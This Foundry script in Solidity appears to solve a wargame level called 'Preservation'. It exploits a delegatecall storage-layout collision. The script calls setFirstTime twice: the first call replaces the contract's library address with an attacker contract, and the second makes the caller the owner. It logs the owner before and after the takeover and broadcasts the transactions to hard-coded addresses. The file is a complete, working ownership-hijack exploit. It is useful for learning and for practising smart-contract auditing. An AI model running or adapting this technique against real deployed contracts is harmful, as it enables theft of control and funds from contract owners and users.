// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Preservation, LibraryContract, PreservationAttacker} from "src/preservation/Preservation.sol";

contract PreservationScript is Script {
    Preservation internal preservation;
    PreservationAttacker internal preservationAttacker;

    LibraryContract internal timeZone1Library;
    LibraryContract internal timeZone2Library;

    function setUp() public virtual {
        preservation = Preservation(0x5078dbdA061aeBb84446152a75aB8107d6a9FCc2);
        timeZone1Library = LibraryContract(preservation.timeZone1Library());
        timeZone2Library = LibraryContract(preservation.timeZone2Library());
        preservationAttacker = PreservationAttacker(
            0xc991edD28C1232ABAF0Adc9C3268e87c4d41e2Fb
        );
    }

    function run() public virtual {
        vm.startBroadcast();
        console2.log("start owner", preservation.owner());
        console2.log("start timeZone1Library", preservation.timeZone1Library());
        preservation.setFirstTime(uint(uint160(address(preservationAttacker))));
        console2.log("end timeZone1Library", preservation.timeZone1Library());
        preservation.setFirstTime(uint(uint160(address(msg.sender))));
        console2.log("end owner", preservation.owner());
        vm.stopBroadcast();
    }
}
